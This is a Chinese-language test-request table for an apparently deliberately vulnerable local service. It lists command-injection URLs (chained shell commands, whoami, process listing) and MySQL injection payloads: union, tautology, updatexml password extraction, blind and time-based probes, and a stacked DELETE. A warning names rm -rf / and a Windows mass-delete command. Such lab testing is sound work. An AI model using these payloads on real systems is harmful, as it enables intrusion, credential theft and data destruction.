一、命令注入漏洞测试请求（接口：/target/cmd/execute?cmd=xxx）
   1. Windows 系统测试请求
      测试场景	完整请求 URL	预期效果
      基础命令执行	http://localhost:9001/target/cmd/execute?cmd=dir	返回当前目录下的文件 / 文件夹列表（无乱码）
      进程列表查询	http://localhost:9001/target/cmd/execute?cmd=tasklist	返回 Windows 系统所有进程信息
      Ping 测试	http://localhost:9001/target/cmd/execute?cmd=ping 127.0.0.1 -n 2	返回 Ping 127.0.0.1 的结果（2 次请求）
      多命令执行	http://localhost:9001/target/cmd/execute?cmd=ping 127.0.0.1 -n 1;dir	先执行 Ping，再执行 dir，返回两个命令的结果
      查看用户	http://localhost:9001/target/cmd/execute?cmd=whoami	返回当前运行服务的系统用户（如NT AUTHORITY\SYSTEM）
   2. Linux/Mac 系统测试请求
      测试场景	完整请求 URL	预期效果
      基础命令执行	http://localhost:9001/target/cmd/execute?cmd=ls -l	返回当前目录下的文件详情（权限、大小、修改时间）
      进程列表查询	http://localhost:9001/target/cmd/execute?cmd=ps -ef	返回 Linux 系统所有进程信息
      Ping 测试	http://localhost:9001/target/cmd/execute?cmd=ping 127.0.0.1 -c 2	返回 Ping 127.0.0.1 的结果（2 次请求）
      多命令执行	http://localhost:9001/target/cmd/execute?cmd=ping 127.0.0.1 -c 1;ls -l	先执行 Ping，再执行 ls -l，返回两个命令的结果
      查看用户	http://localhost:9001/target/cmd/execute?cmd=whoami	返回当前运行服务的系统用户（如root/ubuntu）


⚠️ 高危提醒：避免测试rm -rf /（Linux）、del /f /s /q C:\*.*（Windows）等破坏性命令，仅在本地测试环境操作！

二、SQL 注入漏洞测试请求（接口：/target/sql/query?id=xxx，基于真实 MySQL）
测试场景	完整请求 URL	预期效果（核心验证点）
普通查询（无注入）	http://localhost:9001/target/sql/query?id=1	返回 id=1 的 admin 用户数据（username: admin, password: admin@123）
联合查询注入	http://localhost:9001/target/sql/query?id=1 union select 3,'hack','hack@789','13700137000'	返回 admin 数据 + 注入的 hack 用户数据（验证联合查询生效）
无合法前缀注入	http://localhost:9001/target/sql/query?id=0 or 1=1	返回所有用户数据（admin+test），验证 “恒真条件” 绕过查询限制
报错注入（泄露密码）	http://localhost:9001/target/sql/query?id=1 and updatexml(1,concat(0x7e,(select password from sys_user where id=1),0x7e),1)	返回 MySQL 真实报错：XPATH syntax error: '~admin@123~'（泄露 admin 密码）
布尔盲注（条件真）	http://localhost:9001/target/sql/query?id=1 and (length((select username from sys_user where id=1))=5)	返回 admin 数据（条件为真，验证布尔盲注生效）
布尔盲注（条件假）	http://localhost:9001/target/sql/query?id=1 and (length((select username from sys_user where id=1))=6)	返回空结果（条件为假，验证布尔盲注生效）
时间盲注	http://localhost:9001/target/sql/query?id=1 and sleep(3)	接口延迟 3 秒返回（验证 MySQL 执行 sleep 函数）
堆叠查询（删数据）	http://localhost:9001/target/sql/query?id=1;delete from sys_user where id=2	先返回 admin 数据，再删除 id=2 的 test 用户（查询id=2时无数据，需提前备份）
